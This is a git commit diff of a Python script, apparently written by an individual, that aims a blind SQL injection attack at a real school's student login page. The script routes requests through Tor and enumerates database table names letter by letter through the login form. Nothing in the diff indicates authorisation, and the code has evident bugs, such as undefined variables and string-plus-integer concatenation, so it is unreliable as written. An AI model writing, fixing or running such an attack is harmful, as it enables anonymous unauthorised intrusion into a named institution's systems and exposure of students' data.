b5e74e71137975c3175873dfcecd6f303834ac20
Sooope <kindraddish@gmail.com>
2024-10-22 23:13:31 +0800

    lots of changes

--- crawler.py
+++ crawler.py
@@ -1,8 +1,7 @@
-import json
+import time
 import requests
-import curlify
 
-url = "--target--"
+url = "http://aos.ssc.edu.hk/aos/e-sportsday/student/index.php"
 
 
 #DO NOT CHANGE THIS PART
@@ -10,31 +9,37 @@ prox = {'http': "socks5://127.0.0.1:9050"}
 rcookie = requests.get(url, proxies=prox)
 cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
 alphabet = ["_","e","t","a","o","i","n","s","h","r","d","l","c","u","m","w","f","g","y","p","b","v","k","j","x","q","z"]
-IsFinish = False
 #DO NOT CHANGE THIS PART
 
-while not IsFinish:
-    i=1
-    for letter in alphabet:
-        injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+i+",1) AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
-        response = requests.post(
-            url,
-            cookies=cookies,
-            data={
-            'input_unique_id': injection,
-            'input_pass': 'a',
-            'btn_login': 'Submit',
-            },
-            verify=False,
-            proxies=prox
-        )
-        print("Response content:")
-        print(response.text)
-        i+=1
-        #print(response.text[40])
-        if response.text[40]=='p':
-            print("correct")
-            break
-    else:
-        print("wrong")
-        IsFinish = True
+table = 0
+while True:
+    char = 1
+    while not isTableFinished:
+
+        for letter in alphabet:
+            injection = "a' OR IF(HEX("+letter+")=HEX((SELECT SUBSTRING(table_name,"+char+",1) AS ExtractString FROM information_schema.tables LIMIT 1 OFFSET "+i-1+")),1,'a'); -- "
+            response = requests.post(
+                url,
+                cookies=cookies,
+                data={
+                'input_unique_id': injection,
+                'input_pass': 'a',
+                'btn_login': 'Submit',
+                },
+                verify=False,
+                proxies=prox
+            )
+            time.sleep(0.7)
+            #print("Response content:")
+            #print(response.text)
+            #print(response.text[40])
+            if response.text[40]=='p':
+                print(letter)
+                char += 1
+                break
+        else:
+            print("table done")
+            isTableFinished = True
+    #-->ADD DETECT ERROR MESSAGE HERE<--
+    #break
+print("DONE\ntable number:"+str(table+1))
